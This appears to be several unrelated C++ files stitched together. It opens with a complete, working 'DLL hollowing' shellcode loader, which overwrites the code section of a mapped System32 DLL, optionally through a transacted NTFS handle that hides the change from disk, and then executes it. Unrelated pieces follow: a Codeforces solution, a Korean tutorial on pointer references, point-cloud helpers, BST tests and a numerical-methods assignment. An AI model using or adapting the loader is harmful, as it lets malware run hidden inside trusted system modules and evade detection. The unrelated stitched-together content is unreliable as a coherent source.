#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <winternl.h>

//
// Definitions
//

typedef LONG(__stdcall* NtCreateSection_t)(HANDLE*, ULONG, void*, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);

NtCreateSection_t NtCreateSection;
NtMapViewOfSection_t NtMapViewOfSection;
NtCreateTransaction_t NtCreateTransaction;

bool CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, uint32_t dwStartRVA, uint32_t dwEndRVA);
void* GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, uint64_t qwRVA);

//
// Hollower logic
//

bool HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCodeBuf, uint32_t dwReqBufSize, uint8_t** ppMappedCode, bool bTxF) {
	WIN32_FIND_DATAW Wfd = { 0 };
	wchar_t SearchFilePath[MAX_PATH] = { 0 };
	HANDLE hFind;
	bool bMapped = false;

	//
	// Locate a DLL in the architecture appropriate system folder which has a sufficient image size to hollow for allocation.
	//

	GetSystemDirectoryW(SearchFilePath, MAX_PATH);
	wcscat_s(SearchFilePath, MAX_PATH, L"\\*.dll");

	if ((hFind = FindFirstFileW(SearchFilePath, &Wfd)) != INVALID_HANDLE_VALUE) {
		do {
			if (GetModuleHandleW(Wfd.cFileName) == nullptr) {
				HANDLE hFile = INVALID_HANDLE_VALUE, hTransaction = INVALID_HANDLE_VALUE;
				wchar_t FilePath[MAX_PATH];
				NTSTATUS NtStatus;
				uint8_t* pFileBuf = nullptr;

				GetSystemDirectoryW(FilePath, MAX_PATH);
				wcscat_s(FilePath, MAX_PATH, L"\\");
				wcscat_s(FilePath, MAX_PATH, Wfd.cFileName);

				//
				// Read the DLL to memory and check its headers to identify its image size.
				//

				if (bTxF) {
					OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };

					NtStatus = NtCreateTransaction(&hTransaction,
						TRANSACTION_ALL_ACCESS,
						&ObjAttr,
						nullptr,
						nullptr,
						0,
						0,
						0,
						nullptr,
						nullptr);

					if (NT_SUCCESS(NtStatus)) {
						hFile = CreateFileTransactedW(FilePath,
							GENERIC_WRITE | GENERIC_READ,
							0,
							nullptr,
							OPEN_EXISTING,
							FILE_ATTRIBUTE_NORMAL,
							nullptr,
							hTransaction,
							nullptr,
							nullptr);
					}
					else {
						printf("- Failed to create transaction (error 0x%x)\r\n", NtStatus);
					}
				}
				else {
					hFile = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
				}

				if (hFile != INVALID_HANDLE_VALUE) {
					uint32_t dwFileSize = GetFileSize(hFile, nullptr);
					uint32_t dwBytesRead = 0;

					pFileBuf = new uint8_t[dwFileSize];

					if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)& dwBytesRead, nullptr)) {
						SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);

						IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;
						IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);
						IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)& pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));

						if (pNtHdrs->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
							if (dwReqBufSize < pNtHdrs->OptionalHeader.SizeOfImage && (_stricmp((char*)pSectHdrs->Name, ".text") == 0 && dwReqBufSize < pSectHdrs->Misc.VirtualSize)) {
								//
								// Found a DLL with sufficient image size: map an image view of it for hollowing.
								//

								printf("* %ws - image size: %d - .text size: %d\r\n", Wfd.cFileName, pNtHdrs->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);

								bool bTxF_Valid = false;
								uint32_t dwCodeRva = 0;

								if (bTxF) {
									//
									// For TxF, make the modifications to the file contents now prior to mapping.
									//

									uint32_t dwBytesWritten = 0;

									//
									// Wipe the data directories that conflict with the code section
									//

									for (uint32_t dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
										if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= pSectHdrs->VirtualAddress && pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < (pSectHdrs->VirtualAddress + pSectHdrs->Misc.VirtualSize)) {
											pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
											pNtHdrs->OptionalHeader.DataDirectory[dwX].Size = 0;
										}
									}

									//
									// Find a range free of relocations large enough to accomodate the code.
									//

									bool bRangeFound = false;
									uint8_t* pRelocBuf = (uint8_t*)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

									if (pRelocBuf != nullptr) {
										for (dwCodeRva = 0; !bRangeFound && dwCodeRva < pSectHdrs->Misc.VirtualSize; dwCodeRva += dwReqBufSize) {
											if (!CheckRelocRange(pRelocBuf, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size, pSectHdrs->VirtualAddress + dwCodeRva, pSectHdrs->VirtualAddress + dwCodeRva + dwReqBufSize)) {
												bRangeFound = true;
												break;
											}
										}

										if (bRangeFound) {
											printf("+ Found a blank region with code section to accomodate payload at 0x%08x\r\n", dwCodeRva);
										}
										else {
											printf("- Failed to identify a blank region large enough to accomodate payload\r\n");
										}

										memcpy(pFileBuf + pSectHdrs->PointerToRawData + dwCodeRva, pCodeBuf, dwReqBufSize);

										if (WriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)& dwBytesWritten, nullptr)) {
											printf("+ Successfully modified TxF file content.\r\n");
											bTxF_Valid = true;
										}
									}
									else {
										printf("- No relocation directory present.\r\n");
									}
								}

								if (!bTxF || bTxF_Valid) {
									HANDLE hSection = nullptr;
									NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile);

									if (NT_SUCCESS(NtStatus)) {
										*pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
										NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.

										if (NT_SUCCESS(NtStatus)) {
											if (*pqwMapBufSize >= pNtHdrs->OptionalHeader.SizeOfImage) { // Verify that the mapped size is of sufficient size. There are quirks to image mapping that can result in the image size not matching the mapped size.
												printf("* %ws - mapped size: %I64u\r\n", Wfd.cFileName, *pqwMapBufSize);
												*ppMappedCode = *ppMapBuf + pSectHdrs->VirtualAddress + dwCodeRva;

												if (!bTxF) {
													uint32_t dwOldProtect = 0;

													if (VirtualProtect(*ppMappedCode, dwReqBufSize, PAGE_READWRITE, (PDWORD)& dwOldProtect)) {
														memcpy(*ppMappedCode, pCodeBuf, dwReqBufSize);

														if (VirtualProtect(*ppMappedCode, dwReqBufSize, dwOldProtect, (PDWORD)& dwOldProtect)) {
															bMapped = true;
														}
													}
												}
												else {
													bMapped = true;
												}
											}
										}
										else {
											printf("- Failed to create mapping of section (error 0x%08x)", NtStatus);
										}
									}
									else {
										printf("- Failed to create section (error 0x%x)\r\n", NtStatus);
									}
								}
								else {
									printf("- TxF initialization failed.\r\n");
								}
							}
						}
					}

					if (pFileBuf != nullptr) {
						delete[] pFileBuf;
					}

					if (hFile != INVALID_HANDLE_VALUE) {
						CloseHandle(hFile);
					}

					if (hTransaction != INVALID_HANDLE_VALUE) {
						CloseHandle(hTransaction);
					}
				}
				else {
					printf("- Failed to open handle to %ws (error %d)\r\n", FilePath, GetLastError());
				}
			}
		} while (!bMapped && FindNextFileW(hFind, &Wfd));

		FindClose(hFind);
	}

	return bMapped;
}

//
// Helpers
//

IMAGE_SECTION_HEADER* GetContainerSectHdr(IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHeader, uint64_t qwRVA) {
	for (uint32_t dwX = 0; dwX < pNtHdrs->FileHeader.NumberOfSections; dwX++) {
		IMAGE_SECTION_HEADER* pCurrentSectHdr = pInitialSectHeader;
		uint32_t dwCurrentSectSize;

		pCurrentSectHdr += dwX;

		if (pCurrentSectHdr->Misc.VirtualSize > pCurrentSectHdr->SizeOfRawData) {
			dwCurrentSectSize = pCurrentSectHdr->Misc.VirtualSize;
		}
		else {
			dwCurrentSectSize = pCurrentSectHdr->SizeOfRawData;
		}

		if ((qwRVA >= pCurrentSectHdr->VirtualAddress) && (qwRVA <= (pCurrentSectHdr->VirtualAddress + dwCurrentSectSize))) {
			return pCurrentSectHdr;
		}
	}

	return nullptr;
}

void* GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, uint64_t qwRVA) {
	IMAGE_SECTION_HEADER* pContainSectHdr;

	if ((pContainSectHdr = GetContainerSectHdr(pNtHdrs, pInitialSectHdrs, qwRVA)) != nullptr) {
		uint32_t dwOffset = (qwRVA - pContainSectHdr->VirtualAddress);

		if (dwOffset < pContainSectHdr->SizeOfRawData) { // Sections can be partially or fully virtual. Avoid creating physical pointers that reference regions outside of the raw data in sections with a greater virtual size than physical.
			return (uint8_t*)(pPeBuf + pContainSectHdr->PointerToRawData + dwOffset);
		}
	}

	return nullptr;
}

bool CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, uint32_t dwStartRVA, uint32_t dwEndRVA) {
	IMAGE_BASE_RELOCATION* pCurrentRelocBlock;
	uint32_t dwRelocBufOffset, dwX;
	bool bWithinRange = false;

	for (pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)pRelocBuf, dwX = 0, dwRelocBufOffset = 0; pCurrentRelocBlock->SizeOfBlock; dwX++) {
		uint32_t dwNumBlocks = ((pCurrentRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t));
		uint16_t* pwCurrentRelocEntry = (uint16_t*)((uint8_t*)pCurrentRelocBlock + sizeof(IMAGE_BASE_RELOCATION));

		for (uint32_t dwY = 0; dwY < dwNumBlocks; dwY++, pwCurrentRelocEntry++) {
#ifdef _WIN64
#define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_DIR64
#else
#define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_HIGHLOW
#endif
			if (((*pwCurrentRelocEntry >> 12) & RELOC_FLAG_ARCH_AGNOSTIC) == RELOC_FLAG_ARCH_AGNOSTIC) {
				uint32_t dwRelocEntryRefLocRva = (pCurrentRelocBlock->VirtualAddress + (*pwCurrentRelocEntry & 0x0FFF));

				if (dwRelocEntryRefLocRva >= dwStartRVA && dwRelocEntryRefLocRva < dwEndRVA) {
					bWithinRange = true;
				}
			}
		}

		dwRelocBufOffset += pCurrentRelocBlock->SizeOfBlock;
		pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)((uint8_t*)pCurrentRelocBlock + pCurrentRelocBlock->SizeOfBlock);
	}

	return bWithinRange;
}

//
// Interface
//

typedef void(*fnAddr)();

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
	if (nArgc < 2) {
		printf("* Usage: %ws [Shellcode file path] txf [Hollow the DLL via a TxF handle (optional)]\r\n", pArgv[0]);
	}
	else {
		bool bTxF = false;

		if (nArgc >= 3 && _wcsicmp(pArgv[2], L"txf") == 0) {
			bTxF = true;
		}

		HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
		NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
		NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
		NtCreateTransaction = (NtCreateTransaction_t)GetProcAddress(hNtdll, "NtCreateTransaction");

		if (bTxF && NtCreateTransaction == nullptr) {
			bTxF = false;
			printf("- TxF is not handled on this system. Disabling preference.\r\n");
		}

		HANDLE hFile;
		const wchar_t* pFilePath = pArgv[1];

		if ((hFile = CreateFileW(pFilePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr)) != INVALID_HANDLE_VALUE) {
			uint32_t dwFileSize = GetFileSize(hFile, nullptr);
			uint8_t* pFileBuf = new uint8_t[dwFileSize];
			uint32_t dwBytesRead;

			printf("+ Successfully opened %ws (size: %d)\r\n", pFilePath, dwFileSize);

			if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)& dwBytesRead, nullptr)) {
				uint8_t* pMapBuf = nullptr, * pMappedCode = nullptr;
				uint64_t qwMapBufSize;

				if (HollowDLL(&pMapBuf, &qwMapBufSize, pFileBuf, dwFileSize, &pMappedCode, bTxF)) {
					printf("+ Successfully mapped an image to hollow at 0x%p (size: %I64u bytes)\r\n", pMapBuf, qwMapBufSize);
					printf("* Calling 0x%p...\r\n", pMappedCode);
					((fnAddr)pMappedCode)();
				}
			}

			delete[] pFileBuf;
			CloseHandle(hFile);
		}
		else {
			printf("- Failed to open %ws (error %d)\r\n", pFilePath, GetLastError());
		}
	}

	return 0;
}

// D. Children Holiday
// https://codeforces.com/edu/course/2/lesson/6/2/practice/contest/283932/problem/D

#include <bits/stdc++.h>

using namespace std;

int main() {
    int n, m;
    while (cin >> m >> n) {
        vector<int> t(n), z(n), y(n);
        for (int i = 0; i < n; i++) {
            cin >> t[i] >> z[i] >> y[i];
        }
        auto ballonNum = [&t, &z, &y](int i, int time) {
            auto period = t[i] * z[i] + y[i];
            return time / period * z[i] + min((time % period) / t[i], z[i]);
        };
        auto canBlow = [m, n, &ballonNum](int time) {
            int cnt = 0;
            for (int i = 0; i < n; i++) {
                cnt += ballonNum(i, time);
                if (cnt >= m) {
                    return true;
                }
            }
            return false;
        };
        int lo = -1, hi = m * 200;  // as m might be 0, set lo = -1
        while (lo + 1 < hi) {
            auto mid = lo + (hi - lo) / 2;
            if (canBlow(mid)) {
                hi = mid;
            } else {
                lo = mid;
            }
        }
        cout << hi << endl;
        auto remaining = m;
        for (int i = 0; i < n; i++) {
            auto num = ballonNum(i, hi);
            if (num > remaining) {
                num = remaining;
            }
            remaining -= num;
            cout << num << " ";
        }
        cout << endl;
    }
    return 0;
}

#include <iostream>

void foo(int*& ptr) // pass pointer by reference
{
    ptr = nullptr; // 실제 ptr 인수를 변경할 수 있다.
    //NULL 포인터로 초기화된 포인터는 메모리상 어떠한 값도 가리키지 않음
    //그러나 초기화되지 않은 포인터는 어떤 값이라도 포함될 수 있고, 참조될 수 있다.
}

int main()
{
    int x = 5;
    int *ptr = &x;
    std::cout << "ptr is: " << (ptr ? "non-null" : "null") << '\n'; // prints non-null
    foo(ptr);
    std::cout << "ptr is: " << (ptr ? "non-null" : "null") << '\n'; // prints null

    return 0;
}

// ########Supported via standard programming aids4o ################
/*
포인터를 참조로 전달하는 방식(`int*&`)은 C++에서 강력한 기능으로, 여러 상황에서 유용합니다. 
이 방식은 주로 함수가 인자로 전달된 포인터를 수정해야 하는 경우에 사용됩니다. 이제 이 방법이 필요한 경우와 그 장점에 대해 설명하겠습니다.

### 1. 포인터를 참조로 전달해야 하는 상황

#### **1.1 동적 메모리 할당**
동적 메모리 할당을 처리하는 함수에서 사용됩니다. 함수가 포인터를 수정하여 호출자에게 새로운 메모리를 할당해주어야 할 때 포인터를 참조로 전달합니다.

예를 들어, 동적 배열을 초기화하는 함수를 작성할 때:
*/

void allocateArray(int*& ptr, int size)
{
    ptr = new int[size]; // 메모리 할당
}

int main()
{
    int* array = nullptr;
    allocateArray(array, 10); // array 포인터가 새 메모리를 가리키도록 수정됨

    // 할당된 배열 사용
    for (int i = 0; i < 10; ++i)
    {
        array[i] = i;
    }

    delete[] array; // 동적 메모리 해제
    return 0;
}

/*
이 예제에서 `allocateArray` 함수는 포인터를 수정하여 `main` 함수에서 사용할 동적 배열을 할당합니다.
포인터를 참조로 전달함으로써, 함수 내에서 메모리 할당을 수행하고 그 결과를 호출자에게 반환할 수 있습니다.

#### **1.2 리소스 해제 및 초기화**
포인터가 동적 자원(예: 메모리, 파일 핸들)을 관리할 때, 함수가 그 포인터를 초기화하거나 자원을 해제한 후 포인터를 무효화해야 할 때 사용됩니다. 

예를 들어, 동적 메모리를 해제하고 포인터를 `nullptr`로 초기화하는 경우:

*/
void deleteArray(int*& ptr)
{
    delete[] ptr; // 동적 메모리 해제
    ptr = nullptr; // 포인터를 무효화
}

int main()
{
    int* array = new int[10];
    deleteArray(array); // 메모리 해제 및 포인터 무효화

    if (array == nullptr) {
        std::cout << "Array pointer is null\n";
    }

    return 0;
}
/*

이 예제에서, `deleteArray` 함수는 포인터를 초기화하고, 메모리를 안전하게 관리할 수 있도록 합니다. 이렇게 하면 해제된 메모리를 가리키는 포인터를 다시 사용하는 실수를 방지할 수 있습니다.

### 2. 포인터를 참조로 전달하는 장점

#### **2.1 포인터의 수정이 가능**
포인터를 참조로 전달하면 함수 내에서 인자로 전달된 포인터를 직접 수정할 수 있습니다. 이는 포인터가 가리키는 메모리 주소를 변경하거나, 
자원을 해제한 후 포인터를 `nullptr`로 설정하는 등의 작업을 가능하게 합니다.

- **함수 내에서 포인터 변경**: 포인터를 참조로 전달하면 함수 내에서 포인터가 가리키는 주소 자체를 변경할 수 있습니다. 이를 통해 함수가 포인터가 가리키는 대상을 변경할 수 있습니다.

#### **2.2 불필요한 복사를 피할 수 있음**
포인터를 참조로 전달하면 포인터의 복사가 발생하지 않으므로, 함수 호출 시 성능에 더 유리할 수 있습니다. 특히 큰 구조체나 객체를 포인터로 가리키는 경우, 
포인터의 복사는 의미가 없고 불필요합니다. 참조로 전달하면 이 복사 비용을 피할 수 있습니다.

#### **2.3 명확한 의도 표현**
코드의 의도가 명확해집니다. 포인터를 참조로 전달함으로써, 함수가 인자로 받은 포인터를 수정할 것임을 명확히 나타낼 수 있습니다. 이는 함수의 인터페이스를 이해하는 데 도움이 됩니다.

### 3. 결론

포인터를 참조로 전달하는 방식은 다음과 같은 경우에 유용합니다:

- 함수가 포인터를 수정해야 할 때.
- 동적 메모리 할당 및 해제를 처리할 때.
- 포인터의 주소를 변경하거나 초기화할 필요가 있을 때.

이 방식은 코드의 효율성을 높이고, 메모리 관리와 같은 중요한 작업에서 실수를 줄여주는 역할을 합니다. 이를 통해 더 안전하고 효율적인 C++ 코드를 작성할 수 있습니다.
*/

#ifndef CONVERSION_HPP
#define CONVERSION_HPP

#include <pcl/point_cloud.h>
#include <pcl/point_types.h>
#include <pcl/io/pcd_io.h>
#include <pcl/filters/voxel_grid.h>
#include <pcl/point_types_conversion.h>
#include <pcl_conversions/pcl_conversions.h>
#include <teaser/geometry.h>

template<typename T>
void pcl2teaser(const pcl::PointCloud<T> &pcl_raw, teaser::PointCloud &cloud) {
    cloud.clear();
    for (const auto &pt: pcl_raw.points) {
        cloud.push_back({pt.x, pt.y, pt.z});
    }
}

template<typename T>
sensor_msgs::PointCloud2 cloud2msg(pcl::PointCloud<T> cloud, std::string frame_id = "map") {
    sensor_msgs::PointCloud2 cloud_ROS;
    pcl::toROSMsg(cloud, cloud_ROS);
    cloud_ROS.header.frame_id = frame_id;
    return cloud_ROS;
}

void xyzi2xyz(pcl::PointCloud<pcl::PointXYZI>::Ptr XYZI, pcl::PointCloud<pcl::PointXYZ>::Ptr XYZ) {
    (*XYZ).points.resize((*XYZI).size());
    for (size_t i = 0; i < (*XYZI).points.size(); i++) {
        (*XYZ).points[i].x = (*XYZI).points[i].x;
        (*XYZ).points[i].y = (*XYZI).points[i].y;
        (*XYZ).points[i].z = (*XYZI).points[i].z;
    }
}

template<typename T>
void pcl2eigen(const pcl::PointCloud<T> &pcl_raw, Eigen::Matrix<double, 3, Eigen::Dynamic> &cloud) {
    int N = pcl_raw.points.size();
    cloud.resize(3, N);
    for (int i = 0; i < N; ++i) {
        cloud.col(i) << pcl_raw.points[i].x, pcl_raw.points[i].y, pcl_raw.points[i].z;
    }
}

template<typename T>
void eigen2pcl(const Eigen::Matrix<double, 3, Eigen::Dynamic> &src, pcl::PointCloud<T> &cloud) {
    int num_pc = src.cols();
    T   pt_tmp;
    if (!cloud.empty()) cloud.clear();
    for (int i = 0; i < num_pc; ++i) {
        pt_tmp.x = src(0, i);
        pt_tmp.y = src(1, i);
        pt_tmp.z = src(2, i);
        cloud.points.emplace_back(pt_tmp);
    }
}

#endif // CONVERSION_HPP

#include <iostream>
#include <vector>
#include <cassert>
#include "BSTClass.h"  

// Crafted with routine coding tools  
int main() {
    BST<int, std::string> bst;

    // Test 1: Insertion and Retrieval
    std::cout << "Test 1: Insertion and Retrieval" << std::endl;
    bst.put(5, "five");
    bst.put(3, "three");
    bst.put(7, "seven");
    bst.put(1, "one");
    bst.put(4, "four");
    bst.put(6, "six");
    bst.put(8, "eight");
    //bst.remove(3);

    // Checking if values were inserted and can be retrieved correctly
    assert(bst.get(5) == "five");
    assert(bst.get(3) == "three");
    assert(bst.get(7) == "seven");
    assert(bst.get(1) == "one");
    assert(bst.get(4) == "four");
    assert(bst.get(6) == "six");
    assert(bst.get(8) == "eight");
    std::cout << "Test 1 passed." << std::endl;

    // Test 2: Tree Size
    std::cout << "\nTest 2: Tree Size" << std::endl;
    assert(bst.size() == 7);  // We inserted 7 unique keys
    std::cout << "Test 2 passed." << std::endl;

    // Test 3: Rank Function
    std::cout << "\nTest 3: Rank Function" << std::endl;
    assert(bst.rank(1) == 0);  
    assert(bst.rank(3) == 1);  
    assert(bst.rank(4) == 2);
    assert(bst.rank(6) == 4);
    assert(bst.rank(7) == 5);
    assert(bst.rank(8) == 6);  
    std::cout << "Test 3 passed." << std::endl;

    // Test 4: Floor Function
    std::cout << "\nTest 4: Floor Function" << std::endl;
    assert(bst.Floor(5) == 5);  // Exact match should return 5
    assert(bst.Floor(2) == 1);  // Floor of 2 should be 1
    assert(bst.Floor(6) == 6);  // Exact match should return 6
    assert(bst.Floor(9) == 8);  // Floor of 9 should be 8
    try {
        bst.Floor(0);  // No floor for 0 in the tree
    } catch (std::out_of_range&) {
        std::cout << "Floor function correctly threw an exception for 0." << std::endl;
    }
    std::cout << "Test 4 passed." << std::endl;

    // Test 5: Ceil Function
    std::cout << "\nTest 5: Ceil Function" << std::endl;
    assert(bst.Ceil(3) == 3);  // Exact match should return 3
    assert(bst.Ceil(5) == 5);  // Exact match should return 5
    assert(bst.Ceil(6) == 6);  // Exact match should return 6
    assert(bst.Ceil(2) == 3);  // Ceil of 2 should be 3
    try {
        bst.Ceil(9);  // No ceiling for 9 in the tree
    } catch (std::out_of_range&) {
        std::cout << "Ceil function correctly threw an exception for 9." << std::endl;
    }
    std::cout << "Test 5 passed." << std::endl;

    // Test 6: Inorder Traversal
    std::cout << "\nTest 6: Inorder Traversal" << std::endl;
    std::vector<int> keys = bst.keys();
    std::vector<int> expectedKeys = {1, 3, 4, 5, 6, 7, 8};
    assert(keys == expectedKeys);
    std::cout << "Inorder traversal is correct: ";
    for (int key : keys) std::cout << key << " ";
    std::cout << "\nTest 6 passed." << std::endl;

    // Test 7: Updating a Key's Value
    std::cout << "\nTest 7: Updating a Key's Value" << std::endl;
    bst.put(5, "FIVE");  // Update the value of key 5
    assert(bst.get(5) == "FIVE");  // Ensure value has been updated
    std::cout << "Test 7 passed." << std::endl;

    // Test 8: Edge Case - Single Element Tree
    std::cout << "\nTest 8: Edge Case - Single Element Tree" << std::endl;
    BST<int, std::string> singleNodeTree;
    singleNodeTree.put(10, "ten");
    assert(singleNodeTree.get(10) == "ten");
    assert(singleNodeTree.size() == 1);
    assert(singleNodeTree.rank(10) == 0);
    assert(singleNodeTree.Floor(10) == 10);
    assert(singleNodeTree.Ceil(10) == 10);
    std::cout << "Test 8 passed." << std::endl;

    // Test 9: Edge Case - Empty Tree
    std::cout << "\nTest 9: Edge Case - Empty Tree" << std::endl;
    BST<int, std::string> emptyTree;
    assert(emptyTree.size() == 0);
    try {
        emptyTree.get(1);
    } catch (std::out_of_range&) {
        std::cout << "Get function correctly threw an exception for an empty tree." << std::endl;
    }
    try {
        emptyTree.Floor(1);
    } catch (std::out_of_range&) {
        std::cout << "Floor function correctly threw an exception for an empty tree." << std::endl;
    }
    try {
        emptyTree.Ceil(1);
    } catch (std::out_of_range&) {
        std::cout << "Ceil function correctly threw an exception for an empty tree." << std::endl;
    }
    std::cout << "Test 9 passed." << std::endl;

    // Test 10: Removal of Nodes
    std::cout << "\nTest 10: Removal of Nodes" << std::endl;
    bst.remove(1);  // Remove leaf node
    assert(bst.size() == 6);
    assert(bst.keys() == std::vector<int>({3, 4, 5, 6, 7, 8}));
    std::cout << "Removed leaf node (1) successfully." << std::endl;

    bst.remove(3);  // Remove node with one child
    assert(bst.size() == 5);
    assert(bst.keys() == std::vector<int>({4, 5, 6, 7, 8}));
    std::cout << "Removed node with one child (3) successfully." << std::endl;

    std::vector<int> watch = bst.keys();
    bst.remove(5);  // Remove node with two children
    assert(bst.size() == 4);
    std::cout<< "wait";
    assert(bst.keys() == std::vector<int>({4, 6, 7, 8}));
    std::cout << "Removed node with two children (5) successfully." << std::endl;

    try {
        bst.get(5);
        assert(false);  // Should not reach here; 5 was removed
    } catch (const std::out_of_range&) {
        std::cout << "Node (5) correctly no longer in tree." << std::endl;
    }
    std::cout << "Test 10 passed." << std::endl;

    /*std::cout << "Test 11: removing everything\n";
    while(!bst.isEmpty()){
        bst.removeMax();
    }*/

    std::cout << "All tests passed successfully!" << std::endl;
    return 0;
}

#include <fstream>
#include <iostream>
#include <iomanip>
#include <vector>
#include <cmath>

#include "reportify.h"

// AI DISCLAIMER: This file was written with the help of GitHub Copilot

using std::ifstream;
using std::cout;
using std::endl;
using std::setw;
using std::vector;

double false_position(double (*f)(double), double x, double y, int n, vector<double> * xs = nullptr) {
    for (int i = 0; i < n; i++) {
        double fx = f(x);
        double fy = f(y);

        double x_new = x - ( (x - y) / (fx - fy) ) * fx;
        double y_new = y;

        double fx_new = f(x_new);

        if (fx_new * fy >= 0) y_new = x;

        x = x_new;
        y = y_new;

        if (xs != nullptr) xs->push_back(x);
    }

    return x;
}

int main() {

    TITLE("Assignment 2 - Numerical Methods");
    AUTHOR("Balder W. Holst");

    //! This is exercise 2 from the 2023 exam. This assignment is about the estimating the error on the Regula Falsi (False Position) method.

    SECTION("i) Evaluate the function");

    //! With $x_0 = -2$ and $y_0 = 2$, state (with at least $6$ digits) the values $f(x_0)$ and $f(y_0)$. (HINT: you should get $f(x_0) \simeq 4.46$ and $f(y_0) \simeq -9.38$). Submit the used code.

    SHOW;

    // Define function
    auto f = [] (double x) { return -pow(x, 3) + 2 * cos(x) - exp(-sin(x + 0.5)); };

    // Evaluate function
    cout << "f(x0) = f(-2) = " << f(-2) << endl;
    cout << "f(y0) = f(2)  = " << f(2) << endl;

    OUTPUT;

    SECTION("ii) Find the root");
    //! Perform $15$ iterations with the Regula Falsi (false position) method starting with $x_0 = -2$ and $y_0 = 2$. State (with at least 6 digits) the values $x_{13}$, $x_{14}$ and $x_{15}$. Submit the used code.

    SPAN("False Position Algorithm", __FILE__, 16, 35);

    SHOW;

    int n = 15;

    vector<double> xs;
    false_position(f, -2, 2, n, &xs);

    for (int i = 0; i < xs.size(); i++) {
        cout << "x" << i+1 << " = " << xs[i] << endl;
    }
    cout << endl;

    OUTPUT;

    SECTION("iii) Accuracy estimation");
    //! Assuming that the order is $1$, provide a precise estimate of the accuracy of $x_{15}$. State the estimate together with a clear explanation on how the estimate was arrived at. \\
    //!
    //! We try to approximate the \emph{convergence constant} $C$ as
    //! $$
    //! \frac{d_k}{d_{k-1}} \to C, \quad \mathrm{where} \quad d_k = x_k - x_{k-1}
    //! $$
    //!
    //! The error $\epsilon$ is then given by (for first order convergence)
    //! $$
    //! \epsilon_k = \frac{-C}{1-C}d_k
    //! $$


    vector<double> ds;
    {
        double prev = 0.0;
        for (int i = 0; i < xs.size(); i++) {
            ds.push_back(xs[i] - prev);
            prev = xs[i];
        }
    }

    vector<double> Cs;
    {
        double prev = 0.0;
        for (int i = 0; i < ds.size(); i++) {
            Cs.push_back(ds[i] / prev);
            prev = ds[i];
        }
    }

    vector<double> epsilons;
    {
        for (int i = 0; i < Cs.size(); i++) {
            epsilons.push_back(-Cs[i] / (1 - Cs[i]) * ds[i]);
        }
    }

    CAPTURE;

    int w = 14;
    cout << setw(w) << "k";
    cout << setw(w) << "x";
    cout << setw(w) << "d";
    cout << setw(w) << "C";
    cout << setw(w) << "epsilon";
    cout << endl << std::showpoint;
    for (int i = 0; i < Cs.size(); i++) {
        cout << setw(w) << i + 1;
        cout << setw(w) << xs[i];
        cout << setw(w) << ds[i];
        cout << setw(w) << Cs[i];
        cout << setw(w) << epsilons[i];
        cout << endl;
    }

    OUTPUT;

    //! After 15 iterations, $x \simeq x_{15} = 0.932286$. The error is estimated to be $\epsilon \simeq \epsilon_{15} = 0.00247971$ assuming a convergence order of $1$.

    return 0;
}
